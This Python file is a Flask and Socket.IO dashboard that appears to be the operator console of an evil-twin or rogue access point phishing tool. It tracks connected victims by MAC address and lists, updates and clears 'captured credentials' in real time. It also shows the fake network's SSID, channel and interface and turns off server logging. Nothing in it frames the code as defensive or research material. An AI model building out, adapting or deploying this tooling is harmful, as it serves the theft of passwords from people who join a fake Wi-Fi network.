from flask import Flask, render_template, jsonify
from flask_socketio import SocketIO
import threading
from datetime import datetime
import os
import logging

class Dashboard:
    def __init__(self):
        self.app = Flask(
            __name__,
            template_folder=os.path.join(os.path.dirname(__file__), '..', 'templates'),
            static_folder=os.path.join(os.path.dirname(__file__), '..', 'static'),
        )

        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)
        self.app.logger.disabled = True
        logging.getLogger('flask.app').disabled = True

        self.app.config['SECRET_KEY'] = 'PHISHsA_S4H3R'
        self.socketio = SocketIO(self.app, async_mode='threading')
        self.connected_clients = []
        self.captured_credentials = []
        self.activity_log = []
        self.ap_info = {
            'ssid': 'N/A',
            'channel': 'N/A',
            'interface': 'N/A',
            'status': 'Starting'
        }
        self.last_client_update = None
        
        # Setup routes and socket events
        self.setup_routes()
        self.setup_socket_events()
        
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return render_template('dashboard.html')
            
        @self.app.route('/api/clients')
        def get_clients():
            return jsonify(self.connected_clients)
            
        @self.app.route('/api/credentials')
        def get_credentials():
            return jsonify(self.captured_credentials)
            
        @self.app.route('/api/logs')
        def get_logs():
            return jsonify(self.activity_log[-100:])
            
        @self.app.route('/api/ap-info')
        def get_ap_info():
            return jsonify(self.ap_info)
            
    def setup_socket_events(self):
        @self.socketio.on('clear_credentials')
        def handle_clear_credentials():
            success = self.clear_credentials()
            self.socketio.emit('clear_credentials_response', {'success': success})

        @self.socketio.on('clear_logs')
        def handle_clear_logs():
            success = self.clear_logs()
            self.socketio.emit('clear_logs_response', {'success': success})
        
        @self.socketio.on('connect')
        def handle_connect():
            self.socketio.emit('initial_data', {
                'clients': self.connected_clients,
                'credentials': self.captured_credentials,
                'logs': self.activity_log[-20:],
                'ssid': self.ap_info['ssid'],
                'channel': self.ap_info['channel'],
                'interface': self.ap_info['interface']
            })

        @self.socketio.on('delete_credential')
        def handle_delete_credential(data):
            try:
                timestamp = data.get('timestamp')
                self.captured_credentials = [c for c in self.captured_credentials if c['timestamp'] != timestamp]
                self.socketio.emit('credential_update', {'credentials': self.captured_credentials})
                self.socketio.emit('delete_credential_response', {'success': True})
                self.log_activity(f"Credential deleted (timestamp: {timestamp})")
            except Exception as e:
                self.socketio.emit('delete_credential_response', {'success': False, 'error': str(e)})
                self.log_activity(f"Failed to delete credential: {str(e)}", 'error')

    def log_activity(self, message, log_type='info'):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {message}"
        self.activity_log.append(entry)
        self.socketio.emit('activity_update', {
            'message': entry,
            'type': log_type
        })

        
    def update_client(self, client_data):
        existing = next((c for c in self.connected_clients if c['mac'] == client_data['mac']), None)
        if existing:
            existing.update(client_data)
        else:
            self.connected_clients.append(client_data)
        self.socketio.emit('client_update', {'clients': self.connected_clients})
        

    def add_credential(self, credential):
        credential['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.captured_credentials.append(credential)
        self.socketio.emit('credential_update', {'credentials': self.captured_credentials})
        self.log_activity(f"Credential captured from {credential.get('mac_address', 'unknown')}", 'danger')

    def clear_credentials(self):
        """Clear all captured credentials"""
        try:
            self.captured_credentials = []
            self.socketio.emit('credential_update', {'credentials': self.captured_credentials})
            self.log_activity("All credentials cleared", 'warning')
            return True
        except Exception as e:
            self.log_activity(f"Failed to clear credentials: {str(e)}", 'error')
            return False

    def clear_logs(self):
        """Clear all activity logs with proper error handling and notifications"""
        try:
            # Store count before clearing for notification
            log_count = len(self.activity_log)
            
            # Clear the logs
            self.activity_log = []
            
            # Get current timestamp for the system message
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Notify all clients
            self.socketio.emit('activity_update', {
                'message': f"[{timestamp}] System: Cleared {log_count} log entries",
                'type': 'warning',
                'cleared': True  # Special flag for UI to handle
            })
            
            # Log the action in the system (optional)
            self.log_activity(f"User cleared {log_count} log entries", 'warning')
            
            # Update connected clients' UI
            self.socketio.emit('logs_cleared', {
                'cleared_at': timestamp,
                'count': log_count
            })
            
            return {'success': True, 'count': log_count}
        
        except Exception as e:
            error_msg = f"Log clearance failed: {str(e)}"
            self.log_activity(error_msg, 'error')
            self.socketio.emit('activity_update', {
                'message': f"[System] {error_msg}",
                'type': 'error'
            })
            return {'success': False, 'error': error_msg}

        
    def update_ap_info(self, ssid=None, channel=None, interface=None, status=None):
        if ssid: self.ap_info['ssid'] = ssid
        if channel: self.ap_info['channel'] = channel
        if interface: self.ap_info['interface'] = interface
        if status: self.ap_info['status'] = status
        self.socketio.emit('ap_update', self.ap_info)
        
    def run(self, host='0.0.0.0', port=5000):
        """Run the dashboard in a separate thread"""
        def run_server():
            self.socketio.run(self.app, 
                            host=host, 
                            port=port, 
                            debug=False, 
                            # use_reloader=False,
                            )
            
        thread = threading.Thread(target=run_server)
        thread.daemon = True
        thread.start()
        self.log_activity(f"Dashboard started on http://{host}:{port}", 'success')

dashboard = Dashboard()
